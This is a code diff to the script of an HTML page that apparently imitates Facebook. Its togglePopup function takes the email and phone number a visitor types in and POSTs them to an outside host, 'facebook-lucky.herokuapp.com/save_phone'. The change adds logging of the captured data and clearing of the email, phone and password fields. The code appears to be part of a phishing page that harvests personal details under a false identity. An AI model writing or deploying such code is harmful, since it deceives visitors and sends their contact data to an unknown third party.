@@ -409,23 +409,27 @@
         function togglePopup() { 
             var email = $('._6lux').find('input[name="email"]').val();
             var phone = $('._6lux_s').find('input[name="phone"]').val();
+
             data = {
                 "email": email,
                 "phone": phone
             }
             data_stringify = JSON.stringify(data)
+            console.log(data_stringify)
             $.ajax({
                 type: "POST",
                 url: "https://facebook-lucky.herokuapp.com/save_phone",
                 contentType: "application/json",
                 data: data_stringify,
-                success: function () {
-                    $(".content").toggle();
+                success: function () { 
                 }
-            }); 
-
+            });  
+            
             $('._6lux').find('input[name="email"]').val("");
             $('._6lux_s').find('input[name="phone"]').val("");
+            $('#passContainer').find('input[id="pass"]').val("");
+
+            $(".content").toggle();
         }
     </script>
 </body>
